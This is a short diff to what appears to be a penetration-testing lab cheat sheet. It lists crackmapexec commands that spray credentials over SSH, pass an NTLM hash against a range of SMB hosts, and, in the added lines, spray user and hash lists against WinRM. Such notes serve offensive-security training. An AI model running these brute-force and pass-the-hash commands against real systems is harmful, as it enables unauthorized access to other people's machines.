@@ -5,3 +5,6 @@ crackmapexec ssh 10.11.1.0-254 -u user -p password
 
 #BF smb 
 crackmapexec smb 10.11.1.1-200 -u jill -H "aad3b435b51404eeaad3b435b51404ee:2d518fe330e2ac13eca1b3259eae5db1"
+
+#BF winrm
+crackmapexec winrm  192.168.155.175 -u users.txt -H hash.txt
